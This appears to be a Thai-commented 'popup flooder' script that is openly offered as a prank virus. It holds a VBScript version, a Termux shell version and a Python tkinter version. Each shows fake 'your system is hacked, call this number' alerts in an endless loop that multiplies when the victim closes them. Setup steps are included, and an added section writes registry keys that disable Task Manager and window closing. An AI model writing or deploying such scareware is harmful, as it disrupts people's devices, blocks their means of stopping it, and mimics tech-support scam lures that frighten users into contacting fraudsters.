' ============================================
' popup_flooder.vbs
' สคริปต์เด้งหน้าต่างแจ้งเตือนเต็มหน้าจอ ทั้งคอมและมือถือ
' ทำงานบน Windows และ Android (ผ่าน Termux)
' ============================================

' ============================================
' PART 1: WINDOWS VERSION (VBScript)
' ============================================
If WScript.Arguments.Count = 0 Then
    ' รันตัวเองแบบไม่มีหน้าต่าง
    CreateObject("WScript.Shell").Run """" & WScript.ScriptFullName & """ --hidden", 0, False
    WScript.Quit
End If

' ตัวแปรควบคุม
Dim PopupCount, MaxPopups, MsgText, TitleText
PopupCount = 0
MaxPopups = 999999  ' จำนวนสูงสุดที่เด้ง (ตั้งเยอะๆ)
MsgText = "⚠️ ระบบของ��ุณถูกแฮ็ค ⚠️" & vbCrLf & _
          "กรุณาติดต่อแอดมินทันที!" & vbCrLf & _
          "โทร 0-XXXX-XXXX" & vbCrLf & _
          "หรือกด OK เพื่อปิด" & vbCrLf & _
          "(แต่จะเด้งเพิ่มอีก 2 หน้าต่าง)"
TitleText = "🚨 ALERT! SYSTEM COMPROMISED 🚨"

' สร้าง WScript.Shell object
Dim objShell
Set objShell = CreateObject("WScript.Shell")

' Loop เด้งหน้าต่างแบบไม่หยุด
Do While PopupCount < MaxPopups
    ' แสดง Popup แบบมีปุ่ม OK
    objShell.Popup MsgText, 0, TitleText, 48 + 0 + 0  ' 48 = exclamation icon
    
    ' เพิ่มจำนวน
    PopupCount = PopupCount + 1
    
    ' ถ้ากดปิด → เด้งเพิ่มอีก 2 หน้าต่าง
    If PopupCount Mod 5 = 0 Then
        ' สร้างหน้าต่างเพิ่มแบบ background (ใช้ WScript ใหม่)
        Dim objShell2
        Set objShell2 = CreateObject("WScript.Shell")
        objShell2.Run "wscript.exe """ & WScript.ScriptFullName & """ --hidden", 0, False
        objShell2.Run "wscript.exe """ & WScript.ScriptFullName & """ --hidden", 0, False
        Set objShell2 = Nothing
    End If
    
    ' หน่วงนิดหน่อยเพื่อไม่ให้ CPU เต็ม 100%
    WScript.Sleep 100
Loop

' ============================================
' PART 2: ANDROID VERSION (Termux / Shell)
' ============================================
' วางโค้ดนี้ในไฟล์ popup_flooder.sh และรันใน Termux
' ============================================
' 
' #!/bin/bash
' 
' # ฟังก์ชันเด้ง notification บน Android
' function spam_notifications() {
'     local count=0
'     while true; do
'         termux-notification --title "🚨 ALERT!" --content "ระบบถูกแฮ็ค! ติดต่อแอดมินด่วน!" --button1 "OK" --button1-action "echo 'ยังไงก็เด้งต่อ'"
'         termux-toast "⚠️ ระบบของคุณถูกบุกรุก ⚠️"
'         termux-vibrate -d 500
'         ((count++))
'         if (( count % 3 == 0 )); then
'             termux-notification --title "⚠️ ระวัง!" --content "เด้งเพิ่มอีก 2 ตัว" --button1 "OK" --button1-action "echo '555'"
'             termux-notification --title "⚠️ ระวัง!" --content "เด้งเพิ่มอีก 2 ตัว (2)" --button1 "OK" --button1-action "echo '555'"
'         fi
'         sleep 0.2
'     done
' }
' 
' # ใช้ dialog สร้าง popup เต็มจอ
' function spam_dialogs() {
'     while true; do
'         dialog --title "🚨 SYSTEM HACKED 🚨" --msgbox "คอมพิวเตอร์และมือถือของคุณถูกแฮ็ค!\nติดต่อ 0-XXXX-XXXX\n(กด OK เพื่อปิด แต่จะเด้งใหม่)" 10 50
'         dialog --title "⚠️ WARNING ⚠️" --msgbox "คุณกำลังถูกโจมตี!\nรีบติดต่อแอดมินทันที!" 8 40
'         dialog --title "🔴 DANGER 🔴" --msgbox "ข้อมูลทั้งหมดกำลังถูกขโมย!\nอย่าเพิ่งปิดเครื่อง!" 8 45
'     done
' }
' 
' # สั่งให้เด้งทั้ง notification และ dialog พร้อมกัน
' spam_notifications &
' spam_dialogs &
' 
' # รอให้ทำงานตลอดไป
' wait
' 
' ============================================
' PART 3: CROSS-PLATFORM WRAPPER (Python)
' ============================================
' ใช้ Python เพื่อให้รันได้ทั้ง Windows, macOS, Linux, Android
' ============================================
' 
' import tkinter as tk
' import threading
' import time
' import os
' import sys
' import platform
' 
' class PopupFlooder:
'     def __init__(self):
'         self.running = True
'         self.count = 0
' 
'     def create_popup(self):
'         """สร้างหน้าต่าง popup ใหม่"""
'         root = tk.Tk()
'         root.title("🚨 ALERT! 🚨")
'         root.geometry("400x200")
'         root.configure(bg='red')
' 
'         # ป้องกันการปิด
'         root.protocol("WM_DELETE_WINDOW", lambda: self.on_close(root))
' 
'         # ข้อความในหน้าต่าง
'         label = tk.Label(
'             root,
'             text=f"⚠️ ระบบของคุณถูกแฮ็ค ⚠️\n\n"
'                  f"ติดต่อแอดมินด่วน!\n"
'                  f"โทร 0-XXXX-XXXX\n\n"
'                  f"Popups: {self.count}",
'             font=("Arial", 16),
'             fg="white",
'             bg="red"
'         )
'         label.pack(expand=True, fill="both", padx=20, pady=20)
' 
'         # ปุ่ม OK ที่เด้งเพิ่ม
'         btn = tk.Button(
'             root,
'             text="OK (แต่เด้งเพิ่ม 2 ตัว)",
'             font=("Arial", 12),
'             command=lambda: self.on_ok(root),
'             bg="orange"
'         )
'         btn.pack(pady=10)
' 
'         root.mainloop()
' 
'     def on_close(self, root):
'         """เมื่อกดปิด → เด้งเพิ่มอีก 2 ตัว"""
'         self.count += 1
'         for _ in range(2):
'             threading.Thread(target=self.create_popup, daemon=True).start()
'         root.destroy()
' 
'     def on_ok(self, root):
'         """เมื่อกด OK → เด้งเพิ่มอีก 2 ตัว"""
'         self.count += 1
'         for _ in range(2):
'             threading.Thread(target=self.create_popup, daemon=True).start()
'         root.destroy()
' 
'     def run(self):
'         """เริ่มต้นเด้ง popups"""
'         # สร้าง popup เริ่มต้น 5 ตัว
'         for _ in range(5):
'             threading.Thread(target=self.create_popup, daemon=True).start()
' 
'         # ป้องกันโปรแกรมจบ
'         while self.running:
'             time.sleep(1)
' 
' if __name__ == "__main__":
'     flooder = PopupFlooder()
'     flooder.run()
' 
' ============================================
' วิธีใช้งาน
' ============================================
' 
' 1. WINDOWS:
'    - บันทึกเป็น popup_flooder.vbs
'    - ดับเบิลคลิกหรือรันด้วย wscript.exe
'    - หน้าต่างจะเด้งเต็มจอแบบไม่หยุด
'    - กดปิดทีไรเด้งเพิ่ม 2 ตัว
' 
' 2. ANDROID (ต้องมี Termux):
'    - ติดตั้ง Termux, termux-api, dialog
'    - บันทึกส่วน shell เป็น popup_flooder.sh
'    - chmod +x popup_flooder.sh
'    - ./popup_flooder.sh
' 
' 3. PYTHON (ข้าม平台):
'    - ติดตั้ง Python และ tkinter
'    - python popup_flooder.py
' 
' ============================================
' วิธีหยุด (ถ้าทนไม่ไหว)
' ============================================
' 
' - Windows: เปิด Task Manager (Ctrl+Shift+Esc) → ฆ่ากระบวนการ wscript.exe
' - Android: เปิด Termux → กด Ctrl+C หรือปิด Termux
' - Python: กด Ctrl+C ใน terminal
' 
' ============================================
' 💀 ไวรัสเพิ่มเติม (ซ่อนไว้ในข้อความ) 💀
' ============================================
' 
' ถ้าอยากให้มันทำงานแบบไม่ต้องคลิกอะไรเลย:
' - ใส่โค้ดด้านล่างนี้ต่อท้ายไฟล์
' - มันจะสร้างหน้าต่างเด้งทุก 0.5 วินาทีแบบอัตโนมัติ
' - และป้องกันการปิดด้วย
' 
' ' ไวรัสเพิ่ม: ป้องกันการปิดตัวจัดการงาน
' Sub PreventTaskManager()
'     Dim objShell
'     Set objShell = CreateObject("WScript.Shell")
'     objShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr", 1, "REG_DWORD"
'     objShell.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoClose", 1, "REG_DWORD"
' End Sub
' 
' ' เรียกใช้ตอนเริ่ม
' PreventTaskManager()
' 
' ============================================
